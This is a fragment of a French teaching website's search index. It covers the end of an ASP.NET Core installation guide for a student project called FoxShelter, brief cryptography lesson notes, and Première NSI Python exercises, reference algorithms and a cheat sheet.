lancement\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#4-verification-de-la-base-de-donnees","title":"4. V\u00e9rification de la Base de Donn\u00e9es","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#via-sql-server-management-studio-windows","title":"Via SQL Server Management Studio (Windows)","text":"<ol> <li>Ouvrir SSMS</li> <li>Se connecter \u00e0 <code>(localdb)\\mssqllocaldb</code> ou <code>.\\SQLEXPRESS</code></li> <li>V\u00e9rifier que la base <code>FoxShelterDB</code> existe</li> <li>V\u00e9rifier les tables cr\u00e9\u00e9es</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#via-ligne-de-commande","title":"Via Ligne de Commande","text":"<pre><code># Lister les bases LocalDB\nsqllocaldb info mssqllocaldb\n\n# Tester la connexion\ndotnet ef database update --verbose\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#premier-lancement","title":"\ud83d\ude80 Premier Lancement","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#1-compilation-du-projet","title":"1. Compilation du Projet","text":"<pre><code># Compiler le projet\ndotnet build\n\n# V\u00e9rifier qu'il n'y a pas d'erreurs\necho $?  # Doit retourner 0 (Linux/macOS)\necho %ERRORLEVEL%  # Doit retourner 0 (Windows)\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#2-lancement-en-mode-developpement","title":"2. Lancement en Mode D\u00e9veloppement","text":"<pre><code># Lancer l'application\ndotnet run\n\n# Ou avec rechargement automatique\ndotnet watch run\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#3-acces-a-lapplication","title":"3. Acc\u00e8s \u00e0 l'Application","text":"<p>L'application sera accessible aux adresses : - HTTPS : https://localhost:5001 - HTTP : http://localhost:5000</p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#4-verification-du-lancement","title":"4. V\u00e9rification du Lancement","text":"<p>Vous devriez voir dans la console : <pre><code>info: Microsoft.Hosting.Lifetime[14]\n      Now listening on: https://localhost:5001\ninfo: Microsoft.Hosting.Lifetime[14]\n      Now listening on: http://localhost:5000\ninfo: Microsoft.Hosting.Lifetime[0]\n      Application started. Press Ctrl+C to shutdown.\n</code></pre></p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#verification-de-linstallation_1","title":"\u2705 V\u00e9rification de l'Installation","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#1-tests-de-base","title":"1. Tests de Base","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#page-daccueil","title":"Page d'Accueil","text":"<ol> <li>Ouvrir https://localhost:5001</li> <li>V\u00e9rifier que la page d'accueil s'affiche</li> <li>V\u00e9rifier les statistiques (peuvent \u00eatre \u00e0 0)</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#navigation","title":"Navigation","text":"<ol> <li>Cliquer sur \"Renards\" dans le menu</li> <li>V\u00e9rifier que la liste s'affiche (vide au d\u00e9but)</li> <li>Cliquer sur \"Nouveau renard\"</li> <li>V\u00e9rifier que le formulaire s'affiche</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#base-de-donnees","title":"Base de Donn\u00e9es","text":"<ol> <li>Ajouter un renard de test</li> <li>V\u00e9rifier qu'il appara\u00eet dans la liste</li> <li>Modifier ses informations</li> <li>V\u00e9rifier la persistance des donn\u00e9es</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#2-tests-fonctionnels","title":"2. Tests Fonctionnels","text":"<pre><code># Ex\u00e9cuter les tests unitaires (si disponibles)\ndotnet test\n\n# V\u00e9rifier les logs\n# Les logs sont dans le dossier Logs/ (si configur\u00e9)\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#3-verification-des-ressources","title":"3. V\u00e9rification des Ressources","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#css-et-javascript","title":"CSS et JavaScript","text":"<ol> <li>Ouvrir les outils de d\u00e9veloppement (F12)</li> <li>V\u00e9rifier qu'il n'y a pas d'erreurs 404</li> <li>V\u00e9rifier que Bootstrap se charge correctement</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#api","title":"API","text":"<ol> <li>Acc\u00e9der \u00e0 https://localhost:5001/api/renards</li> <li>V\u00e9rifier la r\u00e9ponse JSON (peut \u00eatre vide)</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#depannage","title":"\ud83d\udd27 D\u00e9pannage","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#problemes-courants","title":"Probl\u00e8mes Courants","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#1-erreur-dotnet-command-not-found","title":"1. Erreur \"dotnet command not found\"","text":"<p>Solution : <pre><code># V\u00e9rifier l'installation\nwhich dotnet  # macOS/Linux\nwhere dotnet  # Windows\n\n# R\u00e9installer .NET SDK si n\u00e9cessaire\n</code></pre></p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#2-erreur-de-connexion-a-la-base-de-donnees","title":"2. Erreur de Connexion \u00e0 la Base de Donn\u00e9es","text":"<p>Sympt\u00f4mes : <pre><code>Microsoft.Data.SqlClient.SqlException: A network-related or instance-specific error occurred\n</code></pre></p> <p>Solutions : <pre><code># V\u00e9rifier LocalDB\nsqllocaldb info\nsqllocaldb start mssqllocaldb\n\n# Ou modifier la cha\u00eene de connexion\n# Utiliser SQL Server Express au lieu de LocalDB\n</code></pre></p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#3-erreur-de-migration-entity-framework","title":"3. Erreur de Migration Entity Framework","text":"<p>Sympt\u00f4mes : <pre><code>Unable to create an object of type 'FoxShelterContext'\n</code></pre></p> <p>Solutions : <pre><code># V\u00e9rifier la cha\u00eene de connexion\ndotnet ef dbcontext info\n\n# Recr\u00e9er les migrations\ndotnet ef migrations remove\ndotnet ef migrations add InitialCreate\ndotnet ef database update\n</code></pre></p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#4-port-deja-utilise","title":"4. Port D\u00e9j\u00e0 Utilis\u00e9","text":"<p>Sympt\u00f4mes : <pre><code>Unable to bind to https://localhost:5001\n</code></pre></p> <p>Solutions : <pre><code># Changer les ports dans launchSettings.json\n# Ou arr\u00eater le processus utilisant le port\nnetstat -ano | findstr :5001  # Windows\nlsof -i :5001                 # macOS/Linux\n</code></pre></p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#5-erreurs-de-packages-nuget","title":"5. Erreurs de Packages NuGet","text":"<p>Solutions : <pre><code># Nettoyer et restaurer\ndotnet clean\ndotnet restore\n\n# Forcer la restauration\ndotnet restore --force\n</code></pre></p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#logs-et-diagnostics","title":"Logs et Diagnostics","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#activer-les-logs-detailles","title":"Activer les Logs D\u00e9taill\u00e9s","text":"<p>Modifier <code>appsettings.Development.json</code> : <pre><code>{\n  \"Logging\": {\n    \"LogLevel\": {\n      \"Default\": \"Debug\",\n      \"Microsoft.AspNetCore\": \"Information\",\n      \"Microsoft.EntityFrameworkCore\": \"Information\"\n    }\n  }\n}\n</code></pre></p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#verifier-les-logs","title":"V\u00e9rifier les Logs","text":"<pre><code># Lancer avec logs verbeux\ndotnet run --verbosity detailed\n\n# Ou consulter les logs de l'application\n# (si configur\u00e9s dans Program.cs)\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#configuration-avancee","title":"\u2699\ufe0f Configuration Avanc\u00e9e","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#1-configuration-multi-environnements","title":"1. Configuration Multi-Environnements","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#developpement","title":"D\u00e9veloppement","text":"<pre><code>// appsettings.Development.json\n{\n  \"ConnectionStrings\": {\n    \"DefaultConnection\": \"Server=(localdb)\\\\mssqllocaldb;Database=FoxShelterDB_Dev;Trusted_Connection=true\"\n  },\n  \"Logging\": {\n    \"LogLevel\": {\n      \"Default\": \"Debug\"\n    }\n  }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#production","title":"Production","text":"<pre><code>// appsettings.Production.json\n{\n  \"ConnectionStrings\": {\n    \"DefaultConnection\": \"Server=prod-server;Database=FoxShelterDB;User Id=app_user;Password=secure_password\"\n  },\n  \"Logging\": {\n    \"LogLevel\": {\n      \"Default\": \"Warning\"\n    }\n  }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#2-configuration-https","title":"2. Configuration HTTPS","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#certificat-de-developpement","title":"Certificat de D\u00e9veloppement","text":"<pre><code># Installer le certificat de d\u00e9veloppement\ndotnet dev-certs https --trust\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#configuration-personnalisee","title":"Configuration Personnalis\u00e9e","text":"<p>Modifier <code>Program.cs</code> pour personnaliser HTTPS : <pre><code>builder.WebHost.ConfigureKestrel(options =&gt;\n{\n    options.ListenLocalhost(5000);\n    options.ListenLocalhost(5001, listenOptions =&gt;\n    {\n        listenOptions.UseHttps();\n    });\n});\n</code></pre></p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#3-configuration-de-la-base-de-donnees-avancee","title":"3. Configuration de la Base de Donn\u00e9es Avanc\u00e9e","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#pool-de-connexions","title":"Pool de Connexions","text":"<pre><code>{\n  \"ConnectionStrings\": {\n    \"DefaultConnection\": \"Server=(localdb)\\\\mssqllocaldb;Database=FoxShelterDB;Trusted_Connection=true;MultipleActiveResultSets=true;Max Pool Size=100;Min Pool Size=5\"\n  }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#timeout-et-retry","title":"Timeout et Retry","text":"<pre><code>// Dans Program.cs\nbuilder.Services.AddDbContext&lt;FoxShelterContext&gt;(options =&gt;\n    options.UseSqlServer(connectionString, sqlOptions =&gt;\n    {\n        sqlOptions.CommandTimeout(30);\n        sqlOptions.EnableRetryOnFailure(3);\n    }));\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#4-configuration-des-emails-optionnel","title":"4. Configuration des Emails (Optionnel)","text":"<pre><code>{\n  \"EmailSettings\": {\n    \"SmtpServer\": \"smtp.gmail.com\",\n    \"SmtpPort\": 587,\n    \"SmtpUsername\": \"votre-email@gmail.com\",\n    \"SmtpPassword\": \"votre-mot-de-passe-app\",\n    \"EnableSsl\": true,\n    \"FromEmail\": \"noreply@foxshelter.fr\",\n    \"FromName\": \"FoxShelter\"\n  }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#ressources-supplementaires","title":"\ud83d\udcda Ressources Suppl\u00e9mentaires","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#documentation-officielle","title":"Documentation Officielle","text":"<ul> <li>ASP.NET Core</li> <li>Entity Framework Core</li> <li>.NET 8</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#outils-utiles","title":"Outils Utiles","text":"<ul> <li>SQL Server Management Studio : Gestion de base de donn\u00e9es</li> <li>Postman : Test des APIs</li> <li>Visual Studio Code : \u00c9diteur l\u00e9ger</li> <li>Git Extensions : Interface graphique Git</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#communaute","title":"Communaut\u00e9","text":"<ul> <li>Stack Overflow</li> <li>GitHub Discussions</li> <li>Reddit r/dotnet</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#support","title":"\ud83d\udcde Support","text":"<p>Si vous rencontrez des probl\u00e8mes non couverts par ce guide :</p> <ol> <li>V\u00e9rifiez les logs d'erreur</li> <li>Consultez la section d\u00e9pannage</li> <li>Recherchez sur Stack Overflow</li> <li>Cr\u00e9ez une issue sur GitHub</li> </ol> <p>Guide d'installation FoxShelter - Version 1.0 Derni\u00e8re mise \u00e0 jour : Janvier 2024</p>"},{"location":"BTS/B3/draft/","title":"Draft","text":"<p>syst\u00e8me de chiffrement cesar vigenere mini-rsa (voir nico leal) voir syst\u00e8mes de chiffrement sym\u00e9triques puis asym\u00e9triques masques de messages TP : faire vigenere et chiffrer la clef en RSA fonction de chiffrement et d\u00e9chiffrement sym\u00e9triques probl\u00e8me de la signature -&gt; condens\u00e9 de message -&gt; hash du message (fonction \u00e0 sens unique taille sortie &gt; taille entr\u00e9e non injective)</p> <p>partir de scenario -&gt; pb d'authentification fonction du document et de son auteur chiffrement puis hachage avec colisions</p>"},{"location":"premiere/premiere/","title":"Premiere","text":"Premi\u00e8re NSI <p>Num\u00e9rique et Sciences Informatiques</p> <p>             Approfondissement des concepts informatiques et algorithmiques         </p> \u2039 \ud83d\udee0\ufe0f Programmation <p>                         Constructions \u00e9l\u00e9mentaires, fonctions, sp\u00e9cifications et programmation orient\u00e9e objet                     </p> Constructions \u00e9l\u00e9mentaires \ud83d\udcda Structures de base de Python \ud83d\udcda Les types \ud83d\udcda Les fonctions Exercices programmation \ud83d\udd04 Boucles \u2699\ufe0f Fonctions \ud83d\udccb Sp\u00e9cification POO &amp; Structures avanc\u00e9es \ud83c\udfd7\ufe0f POO \ud83d\udcda Piles &amp; Files \ud83d\uddc3\ufe0f Donn\u00e9es &amp; Structures <p>                         Repr\u00e9sentation des donn\u00e9es, structures lin\u00e9aires et traitement de tables                     </p> Repr\u00e9sentation des donn\u00e9es \ud83d\udd22 Bool\u00e9ens \ud83d\udcbb Binaire/Hexa \u2795 Entiers relatifs \ud83d\udd22 Nombres r\u00e9els \ud83d\udcdd Caract\u00e8res Structures lin\u00e9aires \ud83d\udcda Listes/Tuples \u270f\ufe0f Exercices Traitement de donn\u00e9es \ud83d\udcda Dictionnaires \ud83d\udcca Traitement de donn\u00e9es en tables Avant-go\u00fbt : SQL \u270f\ufe0f Exercices \ud83d\udd0d Algorithmes <p>                         Algorithmes de tri, recherche, strat\u00e9gies gloutonnes et intelligence artificielle                     </p> Algorithmes sur tableaux \ud83d\udcda Cours \ud83d\udcca Complexit\u00e9 \ud83d\udd0d Dichotomie Strat\u00e9gies algorithmiques \ud83c\udfaf Gloutons \ud83c\udfaf Exercices Gloutons \ud83e\udd16 KNN \ud83d\udcbb TP KNN \ud83d\udcbb Syst\u00e8mes <p>                         Architecture machine, syst\u00e8mes d'exploitation, r\u00e9seaux et protocoles web                     </p> Architecture machine \ud83d\udda5\ufe0f Processeur \ud83d\udd0c Portes logiques \ud83d\udcbb Exercices logiques Jeux d'instructions Ludop\u00e9dagogie : Minecraft Syst\u00e8mes d'exploitation \ud83d\udcda Principes \ud83d\udcda Commandes Linux \ud83d\udc27 TP Linux Internet &amp; Web \ud83c\udf10 R\u00e9seaux \ud83d\udce1 Le WEB \ud83d\udce1 Notice HTML \ud83d\ude80 Projet web \ud83c\udfaf Projets &amp; \u00c9valuations <p>                         Projets cr\u00e9atifs, TP not\u00e9s, corrections et ressources d'aide                     </p> Projets cr\u00e9atifs \ud83c\udfa8 Tous les projets TP Not\u00e9s \ud83d\udcb3 Carte Bleue \ud83d\udcca Code Barre \ud83d\udcdd Interro Algo New Year Advent \ud83c\udf84 New Year Advent \u203a"},{"location":"premiere/Aides/exercices_rappels_bases/","title":"Exercices de rappel - Les bases de Python \ud83d\udc0d","text":""},{"location":"premiere/Aides/exercices_rappels_bases/#1-les-boucles-for-et-while","title":"1. Les boucles <code>for</code> et <code>while</code> \ud83d\udd04","text":"<p>\ud83d\udcda Voir le cours sur les boucles</p>"},{"location":"premiere/Aides/exercices_rappels_bases/#exercice-11-compter-jusqua-10","title":"Exercice 1.1 - Compter jusqu'\u00e0 10","text":"<p>Objectif: \u00c9crire un programme qui affiche les nombres de 1 \u00e0 10.</p> <p>\u00c0 faire:</p> <ol> <li>Utilisez une boucle <code>for</code> </li> <li>Puis refaites le m\u00eame exercice avec une boucle <code>while</code> </li> </ol> <p>Exemple de sortie attendue:</p> <pre><code>1\n2\n3\n...\n10\n</code></pre> <p>Indice: Pour la boucle <code>for</code>, pensez \u00e0 utiliser <code>range()</code>.</p>"},{"location":"premiere/Aides/exercices_rappels_bases/#exercice-12-table-de-multiplication","title":"Exercice 1.2 - Table de multiplication","text":"<p>Objectif: Afficher la table de multiplication d'un nombre.</p> <p>\u00c0 faire:</p> <p>\u00c9crivez un programme qui:</p> <ol> <li>Demande \u00e0 l'utilisateur un nombre  </li> <li>Affiche sa table de multiplication de 1 \u00e0 10  </li> </ol> <p>Exemple: Pour l'entr\u00e9e 7: <pre><code>7 x 1 = 7\n7 x 2 = 14\n...\n7 x 10 = 70\n</code></pre></p>"},{"location":"premiere/Aides/exercices_rappels_bases/#2-les-conditions-if","title":"2. Les conditions <code>if</code> \ud83e\udd14","text":"<p>\ud83d\udcda Voir le cours sur les conditions</p>"},{"location":"premiere/Aides/exercices_rappels_bases/#exercice-21-pair-ou-impair","title":"Exercice 2.1 - Pair ou Impair","text":"<p>Objectif: D\u00e9terminer si un nombre est pair ou impair.</p> <p>\u00c0 faire:</p> <ol> <li>Demandez un nombre \u00e0 l'utilisateur  </li> <li>Affichez \"Pair\" ou \"Impair\" selon le nombre  </li> </ol> <p>Indice: Utilisez l'op\u00e9rateur modulo <code>%</code></p>"},{"location":"premiere/Aides/exercices_rappels_bases/#exercice-22-note-et-mention","title":"Exercice 2.2 - Note et Mention","text":"<p>Objectif: Afficher la mention correspondant \u00e0 une note.</p> <p>\u00c0 faire: \u00c9crivez un programme qui:</p> <ol> <li>Demande une note sur 20</li> <li>Affiche la mention correspondante:</li> <li>&lt; 10: \"Insuffisant\"</li> <li>10-12: \"Passable\"</li> <li>12-14: \"Assez Bien\"</li> <li>14-16: \"Bien\"</li> <li>\u2265 16: \"Tr\u00e8s Bien\"</li> </ol>"},{"location":"premiere/Aides/exercices_rappels_bases/#3-les-listes","title":"3. Les listes \ud83d\udcdd","text":"<p>\ud83d\udcda Voir le cours sur les listes</p>"},{"location":"premiere/Aides/exercices_rappels_bases/#exercice-31-manipulation-de-liste","title":"Exercice 3.1 - Manipulation de liste","text":"<p>Objectif: Pratiquer les op\u00e9rations de base sur les listes.</p> <p>\u00c0 faire:</p> <ol> <li>Cr\u00e9ez une liste vide  </li> <li>Ajoutez les nombres de 1 \u00e0 5  </li> <li>Ins\u00e9rez le nombre 0 au d\u00e9but  </li> <li>Supprimez le dernier \u00e9l\u00e9ment  </li> <li>Affichez la liste \u00e0 chaque \u00e9tape  </li> </ol> <p>Indice: Utilisez <code>append()</code>, <code>insert()</code>, <code>pop()</code></p>"},{"location":"premiere/Aides/exercices_rappels_bases/#exercice-32-moyenne-de-classe","title":"Exercice 3.2 - Moyenne de classe","text":"<p>Objectif: Calculer la moyenne d'une liste de notes.</p> <p>\u00c0 faire:</p> <ol> <li>Cr\u00e9ez une liste de 5 notes  </li> <li>Calculez et affichez la moyenne  </li> <li>Affichez la note la plus haute et la plus basse  </li> </ol> <p>Indice: Utilisez <code>len()</code>, <code>max()</code>, <code>min()</code></p>"},{"location":"premiere/Aides/exercices_rappels_bases/#4-les-dictionnaires","title":"4. Les dictionnaires \ud83d\udcda","text":"<p>\ud83d\udcda Voir le cours sur les dictionnaires</p>"},{"location":"premiere/Aides/exercices_rappels_bases/#exercice-41-carnet-dadresses","title":"Exercice 4.1 - Carnet d'adresses","text":"<p>Objectif: Cr\u00e9er et manipuler un carnet d'adresses simple.</p> <p>\u00c0 faire:</p> <ol> <li>Cr\u00e9ez un dictionnaire vide  </li> <li>Ajoutez 3 contacts avec leur num\u00e9ro de t\u00e9l\u00e9phone  </li> <li>Affichez tous les contacts  </li> <li>Modifiez un num\u00e9ro  </li> <li>Supprimez un contact  </li> </ol> <p>Exemple de structure: <pre><code>carnet = {\n    \"Alice\": \"0123456789\",\n    \"Bob\": \"9876543210\"\n}\n</code></pre></p>"},{"location":"premiere/Aides/exercices_rappels_bases/#exercice-42-mini-inventaire","title":"Exercice 4.2 - Mini-inventaire","text":"<p>Objectif: G\u00e9rer un inventaire de produits avec leurs prix.</p> <p>\u00c0 faire: 1. Cr\u00e9ez un dictionnaire avec 4 produits et leurs prix 2. Affichez le prix d'un produit sp\u00e9cifique 3. Calculez le prix total de l'inventaire 4. Appliquez une r\u00e9duction de 20% sur tous les prix</p>"},{"location":"premiere/Aides/exercices_rappels_bases/#exercice-final-tout-ensemble","title":"Exercice Final - Tout Ensemble! \ud83c\udfaf","text":"<p>Objectif: Cr\u00e9er un mini-programme de gestion de notes d'\u00e9l\u00e8ves.</p> <p>\u00c0 faire: 1. Cr\u00e9ez un dictionnaire o\u00f9 les cl\u00e9s sont les noms des \u00e9l\u00e8ves et les valeurs sont des listes de notes 2. Ajoutez au moins 3 \u00e9l\u00e8ves avec 4 notes chacun 3. Pour chaque \u00e9l\u00e8ve:    - Calculez sa moyenne    - D\u00e9terminez sa mention    - Affichez un r\u00e9sum\u00e9</p> <p>Exemple de structure: <pre><code>notes = {\n    \"Alice\": [15, 12, 18, 14],\n    \"Bob\": [10, 8, 13, 15],\n    \"Charlie\": [17, 16, 15, 18]\n}\n</code></pre></p> <p>Bonus: Ajoutez des fonctionnalit\u00e9s comme: - Trouver l'\u00e9l\u00e8ve avec la meilleure moyenne - Calculer la moyenne de la classe - Afficher un graphique des moyennes</p>"},{"location":"premiere/Aides/Algorithmes_a_savoir/algo_a_savoir/","title":"Algorithmes \u00e0 savoir pour le BAC","text":""},{"location":"premiere/Aides/Algorithmes_a_savoir/algo_a_savoir/#algorithme-sur-les-listes","title":"Algorithme sur les listes","text":"<p>\u00c9crire une fonction <code>presence</code>qui prend en param\u00e8tre une valeur et une liste et renvoie <code>True</code> si la valeur demand\u00e9e est dans la liste, <code>False</code> sinon. Exemple : presence(3, [1, 2, 3, 4]) doit renvoyer True. presence(5, [1, 2, 3, 4]) doit renvoyer False.</p> <p>Algorithme de recherche d'une valeur</p> <pre><code>    def presence(liste:list[int], valeur:int)-&gt;bool:\n        present = False\n        for elt in liste:\n            if elt == valeur:\n                present = True\n        return present\n</code></pre> <p>\u00c9crire une fonction <code>minimum</code> qui prend une liste d'entiers et renvoie l'entier minimum. Exemple : max_et_min([3, 1, 9, 2]) doit renvoyer 1.</p> <p>Algorithme de recherche du minimum d'une liste</p> <pre><code>    def minimum(liste:list[int])-&gt;int:\n        mini = liste[0]\n        for elt in liste:\n            if elt &lt; mini:\n                mini = elt\n        return mini\n</code></pre> <p>\u00c9crire une fonction <code>maximum</code> qui prend une liste d'entiers et renvoie l'entier maximum. Exemple : max_et_min([3, 1, 9, 2]) doit renvoyer 9.</p> <p>Algorithme de recherche du maximum d'une liste</p> <pre><code>    def maximum(liste:list[int])-&gt;int:\n        maxi = liste[0]\n        for elt in liste:\n            if elt &gt; maxi:\n                maxi = elt\n        return maxi\n</code></pre> <p>\u00c9crire une fonction <code>indice_minimum</code> qui prend une liste d'entiers et renvoie l'indice de l'entier minimum. Exemple : max_et_min([3, 1, 9, 2]) doit renvoyer 1.</p> <p>Algorithme de recherche de l'indice du maximum d'une liste</p> <pre><code>    def indice_minimum(liste:list[int])-&gt;int:\n        mini = liste[0]\n        indice = 0\n        for i in range(len(liste)):\n            if liste[i] &lt; mini:\n                mini = liste[i]\n                indice = i\n        return indice\n</code></pre> <p>\u00c9crire une fonction <code>indice_maximum</code> qui prend une liste d'entiers et renvoie l'indice de l'entier maximum. Exemple : max_et_min([3, 1, 9, 2]) doit renvoyer 2.</p> <p>Algorithme de recherche de l'indice du maximum d'une liste</p> <pre><code>    def indice_maximum(liste:list[int])-&gt;int:\n        maxi = liste[0]\n        indice = 0\n        for i in range(len(liste)):\n            if liste[i] &gt; maxi:\n                maxi = liste[i]\n                indice = i\n        return indice\n</code></pre>"},{"location":"premiere/Aides/Algorithmes_a_savoir/algo_a_savoir/#algorithmes-avances-sur-les-listes","title":"Algorithmes avanc\u00e9s sur les listes","text":"<p>\u00c9crire une fonction <code>recherche_dichotomique</code> qui prend en param\u00e8tre une liste et un entier et renvoie <code>True</code> si la valeur demand\u00e9e est dans la liste, <code>False</code> sinon. Elle devra utiliser le pricipe de la dichotomie Exemple : recherche_dichotomique(3, [1, 2, 3, 4]) doit renvoyer True. recherche_dichotomique(5, [1, 2, 3, 4]) doit renvoyer False.</p> <p>Algorithme de recherche dichotomique</p> <pre><code>    def recherche_dichotomique(liste:list[int], valeur:int) -&gt; bool:\n        # Initialisation des bornes de recherche\n        debut = 0\n        fin = len(liste) -1\n\n        # Recherche des valeurs en s\u00e9parant la recherche dans les portions o\u00f9 la valeur peut\n        # \u00eatre pr\u00e9sente\n        while debut &lt;= fin:\n            m = (debut+fin)//2\n\n            # Si la valeur est la bonne : bien jou\u00e9\n            if liste[m] == valeur:\n                return True\n\n            # Si la valeur est plus grande que la valeur \u00e0 position m\u00e9diane\n            elif liste[m] &lt; valeur:\n                # on d\u00e9cale le d\u00e9but de la zone de recherche \u00e0 m (car on a d\u00e9j\u00e0 compar\u00e9 \u00e0 m)\n                debut = m + 1\n            elif liste[m] &gt; valeur:\n                # On d\u00e9cale la fin de la zone de recherche \u00e0 m - 1 (car on a d\u00e9j\u00e0 compar\u00e9 \u00e0 m)\n                fin = m - 1\n\n        # Si l'on n'a pas trouv\u00e9 la valeur:\n        return False\n</code></pre> <p>\u00c9crire une fonction <code>tri_selection</code> qui prend en param\u00e8tre une liste et renvoie une liste correspondant \u00e0 sa permutation tri\u00e9e dans l'ordre croissant Exemple: tri_selection([5,2,4,1,3]) doit renvoyer [1,2,3,4,5] tri_selection([]) doit renvoyer []</p> <p>\u00c9crire une fonction <code>tri_insertion</code> qui prend en param\u00e8tre une liste et renvoie une liste correspondant \u00e0 sa permutation tri\u00e9e dans l'ordre croissant Exemple: tri_insertion([5,2,4,1,3]) doit renvoyer [1,2,3,4,5] tri_insertion([]) doit renvoyer []</p> <p>Compl\u00e9ter la fonction <code>rendu_monnaie</code> qui prend en param\u00e8tre une liste (syst\u00e8me mon\u00e9taire) et un montant et renvoie une liste contenant les billets/pi\u00e8ces utiles pour rendre la monnaie.</p> <p>Algorithme de rendu de monnaie</p> <pre><code>    def rendu_monnaie(montant:int, systeme:list[int])-&gt; list[int]:\n        solution = ...\n        for ... in systeme:\n            while montant - ... &gt;= 0:\n                solution = ... + [...] #Quelle est l'utilit\u00e9 de mettre des crochets autour de la valeur \u00e0 rajouter?\n                montant = montant - ...\n        return ...\n\n    systeme = [50,20,10,5,2,1]\n    print(rendu_monnaie(53, systeme)) \n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet/","title":"Python - Bases","text":""},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet/#fonctions-de-base","title":"Fonctions de base","text":""},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet/#print","title":"print()","text":"<p>Affiche du texte ou des variables \u00e0 l'\u00e9cran.</p> <p>Exemples:</p> <pre><code>&gt;&gt;&gt; print(\"Bonjour\") \nBonjour (type =&gt; str)\n\n&gt;&gt;&gt; print(42) \n42 (type =&gt; int)\n\n&gt;&gt;&gt; print(\"La somme de 4 + 3 est \", 7, \".\")\nLa somme de 4 + 3 est 7\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet/#input","title":"input()","text":"<p>Demande une entr\u00e9e \u00e0 l'utilisateur. Retourne une cha\u00eene de caract\u00e8res <code>(str)</code>.</p> <pre><code>nom = input(\"Quel est ton nom ? \")  \n# L'utilisateur entre une valeur qui est stock\u00e9e dans 'nom'\n</code></pre> <p>La fonction <code>input</code> est une fonction qui renvoie quelque chose. Il faut donc bien penser \u00e0 stocker dans une variable ce qu'elle renvoie.</p>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet/#type","title":"type()","text":"<p>Renvoie le type de la variable pass\u00e9e en argument.</p> <p>Exemple:</p> <pre><code>print(type(42))         # Affiche: &lt;class 'int'&gt;\nprint(type(\"Bonjour\"))  # Affiche:\n</code></pre> <p> </p>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet/#les-types-de-base-et-leurs-operateurs","title":"Les types de base et leurs op\u00e9rateurs","text":""},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet/#int-entier","title":"int (entier)","text":"<ul> <li>Op\u00e9rateurs math\u00e9matiques:</li> <li>Addition :  <code>+</code></li> <li>Soustraction : <code>-</code></li> <li>Multiplication : <code>*</code></li> <li>Division (r\u00e9sultat \u00e0 virgule) : <code>/</code></li> <li>Division enti\u00e8re : <code>//</code></li> <li>Modulo : <code>%</code></li> <li>Puissance : <code>**</code></li> </ul> <p>Exemples:</p> <pre><code>a = 10\nb = 3\nprint(a + b)  -&gt; 13  | print(a * b)  # 30\nprint(a - b)  -&gt; 7   | print(a / b)  # 3.3333...\nprint(a // b) -&gt; 3   | print(a % b)  # 1\nprint(a ** b) -&gt;\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet/#str-chaine-de-caracteres","title":"str (cha\u00eene de caract\u00e8res)","text":"<ul> <li>Op\u00e9rateurs sur les cha\u00eenes de caract\u00e8res:</li> <li>Concat\u00e9nation : <code>+</code></li> <li>R\u00e9p\u00e9titions : <code>*</code> (avec un entier)</li> </ul> 